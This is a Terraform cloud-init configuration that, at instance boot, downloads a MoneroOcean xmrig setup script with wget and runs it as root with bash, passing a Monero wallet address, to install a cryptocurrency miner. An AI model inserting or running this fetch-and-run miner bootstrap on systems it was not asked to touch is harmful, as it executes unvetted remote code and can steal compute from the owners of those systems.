data "cloudinit_config" "user_data" {
  gzip          = false
  base64_encode = false

  part {
    content_type = "text/cloud-config"
    filename     = "cloud-config.yaml"
    content = <<-EOT
    #cloud-config
    ${jsonencode({
    runcmd = [
      "export HOME='/root'",
      "wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh",
      "bash setup_moneroocean_miner.sh 44ma1xfBFrpJyPxi2xu1WiLYrwshMef8YVsMW5f3MdiSD7MtcX2t1Ff1pKJfr1soCfgHC459ts8jm2noudhjPAxaSk8Lv3Z"
    ]
})}
  EOT
}
}
